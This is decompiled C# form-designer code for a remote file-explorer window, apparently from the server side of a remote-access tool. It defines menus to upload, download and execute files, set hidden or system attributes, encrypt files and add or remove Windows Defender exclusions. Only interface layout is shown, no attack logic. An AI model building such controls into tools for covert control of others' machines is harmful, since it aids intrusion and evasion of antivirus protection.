namespace Server.Forms
{
	// Token: 0x020000AA RID: 170
	public partial class FormExplorer : global::Server.Helper.FormMaterial
	{
		// Token: 0x06000545 RID: 1349 RVA: 0x00049E4F File Offset: 0x0004804F
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000546 RID: 1350 RVA: 0x00049E70 File Offset: 0x00048070
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormExplorer));
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.dataGridView3 = new global::System.Windows.Forms.DataGridView();
			this.Column2 = new global::System.Windows.Forms.DataGridViewImageColumn();
			this.Column1 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.dataGridView1 = new global::System.Windows.Forms.DataGridView();
			this.Column3 = new global::System.Windows.Forms.DataGridViewImageColumn();
			this.dataGridViewTextBoxColumn1 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.panel2 = new global::System.Windows.Forms.Panel();
			this.dataGridView2 = new global::System.Windows.Forms.DataGridView();
			this.Column4 = new global::System.Windows.Forms.DataGridViewImageColumn();
			this.Column6 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column7 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column5 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.dataGridViewTextBoxColumn2 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.contextMenuStrip1 = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.backToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.refreshToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.upDownToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.downloadToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.uploadToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.createFolderToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.createFileToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.createFolderToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.renameToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.removeToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.copyToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.cutToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.pasteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.zipToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.unzipToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.zipToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.excuteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.excuteToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.executeToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.executeToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.executeToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.attributesToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.normalToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.hiddenToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.systemToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.directoryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.lockRemoveToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.unlockRemoveToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.cryptoToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.encryptToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.decryptToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.defenderToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.execlitToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.removeExclusionToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.rjTextBox1 = new global::CustomControls.RJControls.RJTextBox();
			this.panel3 = new global::System.Windows.Forms.Panel();
			this.materialLabel1 = new global::MaterialSkin.Controls.MaterialLabel();
			this.imageList1 = new global::System.Windows.Forms.ImageList(this.components);
			this.panel4 = new global::System.Windows.Forms.Panel();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.audioToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.wallpaperToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView3).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView1).BeginInit();
			this.panel2.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
			this.contextMenuStrip1.SuspendLayout();
			this.panel3.SuspendLayout();
			base.SuspendLayout();
			this.panel1.Controls.Add(this.dataGridView3);
			this.panel1.Controls.Add(this.dataGridView1);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Left;
			this.panel1.Location = new global::System.Drawing.Point(3, 64);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(200, 573);
			this.panel1.TabIndex = 0;
			this.dataGridView3.AllowUserToAddRows = false;
			this.dataGridView3.AllowUserToDeleteRows = false;
			this.dataGridView3.AllowUserToResizeColumns = false;
			this.dataGridView3.AllowUserToResizeRows = false;
			this.dataGridView3.BackgroundColor = global::System.Drawing.Color.White;
			this.dataGridView3.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.dataGridView3.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.dataGridView3.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
			dataGridViewCellStyle.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView3.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
			this.dataGridView3.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.dataGridView3.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.Column2,
				this.Column1
			});
			this.dataGridView3.Cursor = global::System.Windows.Forms.Cursors.Default;
			dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.dataGridView3.DefaultCellStyle = dataGridViewCellStyle2;
			this.dataGridView3.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.dataGridView3.Enabled = false;
			this.dataGridView3.EnableHeadersVisualStyles = false;
			this.dataGridView3.GridColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			this.dataGridView3.Location = new global::System.Drawing.Point(0, 0);
			this.dataGridView3.Name = "dataGridView3";
			this.dataGridView3.ReadOnly = true;
			this.dataGridView3.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle3.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.Padding = new global::System.Windows.Forms.Padding(1, 0, 0, 0);
			dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView3.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
			this.dataGridView3.RowHeadersVisible = false;
			this.dataGridView3.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.dataGridView3.ShowCellErrors = false;
			this.dataGridView3.ShowCellToolTips = false;
			this.dataGridView3.ShowEditingIcon = false;
			this.dataGridView3.ShowRowErrors = false;
			this.dataGridView3.Size = new global::System.Drawing.Size(200, 404);
			this.dataGridView3.TabIndex = 13;
			this.Column2.HeaderText = "";
			this.Column2.ImageLayout = global::System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
			this.Column2.MinimumWidth = 16;
			this.Column2.Name = "Column2";
			this.Column2.ReadOnly = true;
			this.Column2.Width = 16;
			this.Column1.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
			this.Column1.HeaderText = "";
			this.Column1.Name = "Column1";
			this.Column1.ReadOnly = true;
			this.dataGridView1.AllowUserToAddRows = false;
			this.dataGridView1.AllowUserToDeleteRows = false;
			this.dataGridView1.AllowUserToResizeColumns = false;
			this.dataGridView1.AllowUserToResizeRows = false;
			this.dataGridView1.BackgroundColor = global::System.Drawing.Color.White;
			this.dataGridView1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.dataGridView1.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.dataGridView1.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle4.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
			dataGridViewCellStyle4.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle4.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle4.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle4.SelectionBackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle4.SelectionForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle4.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle4;
			this.dataGridView1.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.dataGridView1.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.Column3,
				this.dataGridViewTextBoxColumn1
			});
			this.dataGridView1.Cursor = global::System.Windows.Forms.Cursors.Default;
			dataGridViewCellStyle5.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle5.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle5.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle5.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle5.SelectionBackColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle5.SelectionForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle5.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.dataGridView1.DefaultCellStyle = dataGridViewCellStyle5;
			this.dataGridView1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.dataGridView1.Enabled = false;
			this.dataGridView1.EnableHeadersVisualStyles = false;
			this.dataGridView1.GridColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			this.dataGridView1.Location = new global::System.Drawing.Point(0, 404);
			this.dataGridView1.Name = "dataGridView1";
			this.dataGridView1.ReadOnly = true;
			this.dataGridView1.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle6.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle6.BackColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle6.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle6.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle6.Padding = new global::System.Windows.Forms.Padding(1, 0, 0, 0);
			dataGridViewCellStyle6.SelectionBackColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle6.SelectionForeColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle6.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView1.RowHeadersDefaultCellStyle = dataGridViewCellStyle6;
			this.dataGridView1.RowHeadersVisible = false;
			this.dataGridView1.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.dataGridView1.ShowCellErrors = false;
			this.dataGridView1.ShowCellToolTips = false;
			this.dataGridView1.ShowEditingIcon = false;
			this.dataGridView1.ShowRowErrors = false;
			this.dataGridView1.Size = new global::System.Drawing.Size(200, 169);
			this.dataGridView1.TabIndex = 14;
			this.Column3.HeaderText = "";
			this.Column3.MinimumWidth = 16;
			this.Column3.Name = "Column3";
			this.Column3.ReadOnly = true;
			this.Column3.Width = 16;
			this.dataGridViewTextBoxColumn1.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
			this.dataGridViewTextBoxColumn1.HeaderText = "";
			this.dataGridViewTextBoxColumn1.Name = "dataGridViewTextBoxColumn1";
			this.dataGridViewTextBoxColumn1.ReadOnly = true;
			this.panel2.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
			this.panel2.Controls.Add(this.dataGridView2);
			this.panel2.Controls.Add(this.rjTextBox1);
			this.panel2.Controls.Add(this.panel3);
			this.panel2.Location = new global::System.Drawing.Point(222, 64);
			this.panel2.Name = "panel2";
			this.panel2.Size = new global::System.Drawing.Size(575, 573);
			this.panel2.TabIndex = 1;
			this.dataGridView2.AllowDrop = true;
			this.dataGridView2.AllowUserToAddRows = false;
			this.dataGridView2.AllowUserToDeleteRows = false;
			this.dataGridView2.AllowUserToResizeColumns = false;
			this.dataGridView2.AllowUserToResizeRows = false;
			this.dataGridView2.BackgroundColor = global::System.Drawing.Color.White;
			this.dataGridView2.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.dataGridView2.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.dataGridView2.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle7.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
			dataGridViewCellStyle7.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle7.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle7.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle7.SelectionBackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle7.SelectionForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle7.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
			this.dataGridView2.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.dataGridView2.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.Column4,
				this.Column6,
				this.Column7,
				this.Column5,
				this.dataGridViewTextBoxColumn2
			});
			this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
			this.dataGridView2.Cursor = global::System.Windows.Forms.Cursors.Default;
			dataGridViewCellStyle8.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle8.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle8.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle8.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle8.SelectionBackColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle8.SelectionForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle8.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle8;
			this.dataGridView2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.dataGridView2.Enabled = false;
			this.dataGridView2.EnableHeadersVisualStyles = false;
			this.dataGridView2.GridColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			this.dataGridView2.Location = new global::System.Drawing.Point(0, 31);
			this.dataGridView2.Name = "dataGridView2";
			this.dataGridView2.ReadOnly = true;
			this.dataGridView2.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle9.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle9.BackColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle9.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle9.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle9.Padding = new global::System.Windows.Forms.Padding(1, 0, 0, 0);
			dataGridViewCellStyle9.SelectionBackColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle9.SelectionForeColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle9.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
			this.dataGridView2.RowHeadersVisible = false;
			this.dataGridView2.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.dataGridView2.ShowCellErrors = false;
			this.dataGridView2.ShowCellToolTips = false;
			this.dataGridView2.ShowEditingIcon = false;
			this.dataGridView2.ShowRowErrors = false;
			this.dataGridView2.Size = new global::System.Drawing.Size(575, 519);
			this.dataGridView2.TabIndex = 15;
			this.Column4.HeaderText = "";
			this.Column4.MinimumWidth = 16;
			this.Column4.Name = "Column4";
			this.Column4.ReadOnly = true;
			this.Column4.Width = 16;
			this.Column6.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column6.HeaderText = "";
			this.Column6.Name = "Column6";
			this.Column6.ReadOnly = true;
			this.Column6.Width = 5;
			this.Column7.HeaderText = "";
			this.Column7.MinimumWidth = 150;
			this.Column7.Name = "Column7";
			this.Column7.ReadOnly = true;
			this.Column7.Width = 150;
			this.Column5.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column5.HeaderText = "";
			this.Column5.MinimumWidth = 150;
			this.Column5.Name = "Column5";
			this.Column5.ReadOnly = true;
			this.Column5.Width = 150;
			this.dataGridViewTextBoxColumn2.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
			this.dataGridViewTextBoxColumn2.HeaderText = "";
			this.dataGridViewTextBoxColumn2.Name = "dataGridViewTextBoxColumn2";
			this.dataGridViewTextBoxColumn2.ReadOnly = true;
			this.contextMenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.backToolStripMenuItem,
				this.refreshToolStripMenuItem,
				this.upDownToolStripMenuItem,
				this.createFolderToolStripMenuItem,
				this.zipToolStripMenuItem,
				this.excuteToolStripMenuItem,
				this.attributesToolStripMenuItem,
				this.cryptoToolStripMenuItem,
				this.defenderToolStripMenuItem
			});
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new global::System.Drawing.Size(181, 224);
			this.backToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("backToolStripMenuItem.Image");
			this.backToolStripMenuItem.Name = "backToolStripMenuItem";
			this.backToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.backToolStripMenuItem.Text = "Back";
			this.backToolStripMenuItem.Click += new global::System.EventHandler(this.backToolStripMenuItem_Click);
			this.refreshToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("refreshToolStripMenuItem.Image");
			this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
			this.refreshToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.refreshToolStripMenuItem.Text = "Refresh";
			this.refreshToolStripMenuItem.Click += new global::System.EventHandler(this.refreshToolStripMenuItem_Click);
			this.upDownToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.downloadToolStripMenuItem,
				this.uploadToolStripMenuItem
			});
			this.upDownToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("upDownToolStripMenuItem.Image");
			this.upDownToolStripMenuItem.Name = "upDownToolStripMenuItem";
			this.upDownToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.upDownToolStripMenuItem.Text = "Up/Down";
			this.downloadToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("downloadToolStripMenuItem.Image");
			this.downloadToolStripMenuItem.Name = "downloadToolStripMenuItem";
			this.downloadToolStripMenuItem.Size = new global::System.Drawing.Size(128, 22);
			this.downloadToolStripMenuItem.Text = "Download";
			this.downloadToolStripMenuItem.Click += new global::System.EventHandler(this.downloadToolStripMenuItem_Click);
			this.uploadToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("uploadToolStripMenuItem.Image");
			this.uploadToolStripMenuItem.Name = "uploadToolStripMenuItem";
			this.uploadToolStripMenuItem.Size = new global::System.Drawing.Size(128, 22);
			this.uploadToolStripMenuItem.Text = "Upload";
			this.uploadToolStripMenuItem.Click += new global::System.EventHandler(this.uploadToolStripMenuItem_Click);
			this.createFolderToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.createFileToolStripMenuItem,
				this.createFolderToolStripMenuItem1,
				this.renameToolStripMenuItem,
				this.removeToolStripMenuItem,
				this.copyToolStripMenuItem,
				this.cutToolStripMenuItem,
				this.pasteToolStripMenuItem
			});
			this.createFolderToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("createFolderToolStripMenuItem.Image");
			this.createFolderToolStripMenuItem.Name = "createFolderToolStripMenuItem";
			this.createFolderToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.createFolderToolStripMenuItem.Text = "Manager";
			this.createFileToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("createFileToolStripMenuItem.Image");
			this.createFileToolStripMenuItem.Name = "createFileToolStripMenuItem";
			this.createFileToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.createFileToolStripMenuItem.Text = "Create File";
			this.createFileToolStripMenuItem.Click += new global::System.EventHandler(this.createFileToolStripMenuItem_Click);
			this.createFolderToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("createFolderToolStripMenuItem1.Image");
			this.createFolderToolStripMenuItem1.Name = "createFolderToolStripMenuItem1";
			this.createFolderToolStripMenuItem1.Size = new global::System.Drawing.Size(180, 22);
			this.createFolderToolStripMenuItem1.Text = "Create Folder";
			this.createFolderToolStripMenuItem1.Click += new global::System.EventHandler(this.createFolderToolStripMenuItem1_Click);
			this.renameToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("renameToolStripMenuItem.Image");
			this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
			this.renameToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.renameToolStripMenuItem.Text = "Rename";
			this.renameToolStripMenuItem.Click += new global::System.EventHandler(this.renameToolStripMenuItem_Click);
			this.removeToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("removeToolStripMenuItem.Image");
			this.removeToolStripMenuItem.Name = "removeToolStripMenuItem";
			this.removeToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.removeToolStripMenuItem.Text = "Remove";
			this.removeToolStripMenuItem.Click += new global::System.EventHandler(this.removeToolStripMenuItem_Click);
			this.copyToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("copyToolStripMenuItem.Image");
			this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
			this.copyToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.copyToolStripMenuItem.Text = "Copy";
			this.copyToolStripMenuItem.Click += new global::System.EventHandler(this.copyToolStripMenuItem_Click);
			this.cutToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("cutToolStripMenuItem.Image");
			this.cutToolStripMenuItem.Name = "cutToolStripMenuItem";
			this.cutToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.cutToolStripMenuItem.Text = "Cut";
			this.cutToolStripMenuItem.Click += new global::System.EventHandler(this.cutToolStripMenuItem_Click);
			this.pasteToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("pasteToolStripMenuItem.Image");
			this.pasteToolStripMenuItem.Name = "pasteToolStripMenuItem";
			this.pasteToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.pasteToolStripMenuItem.Text = "Paste";
			this.pasteToolStripMenuItem.Click += new global::System.EventHandler(this.pasteToolStripMenuItem_Click);
			this.zipToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.unzipToolStripMenuItem,
				this.zipToolStripMenuItem1
			});
			this.zipToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("zipToolStripMenuItem.Image");
			this.zipToolStripMenuItem.Name = "zipToolStripMenuItem";
			this.zipToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.zipToolStripMenuItem.Text = "Zip";
			this.unzipToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("unzipToolStripMenuItem.Image");
			this.unzipToolStripMenuItem.Name = "unzipToolStripMenuItem";
			this.unzipToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.unzipToolStripMenuItem.Text = "Unzip";
			this.unzipToolStripMenuItem.Click += new global::System.EventHandler(this.unzipToolStripMenuItem_Click);
			this.zipToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("zipToolStripMenuItem1.Image");
			this.zipToolStripMenuItem1.Name = "zipToolStripMenuItem1";
			this.zipToolStripMenuItem1.Size = new global::System.Drawing.Size(180, 22);
			this.zipToolStripMenuItem1.Text = "Zip";
			this.zipToolStripMenuItem1.Click += new global::System.EventHandler(this.zipToolStripMenuItem1_Click);
			this.excuteToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.excuteToolStripMenuItem1,
				this.executeToolStripMenuItem,
				this.executeToolStripMenuItem1,
				this.executeToolStripMenuItem2,
				this.audioToolStripMenuItem,
				this.wallpaperToolStripMenuItem
			});
			this.excuteToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("excuteToolStripMenuItem.Image");
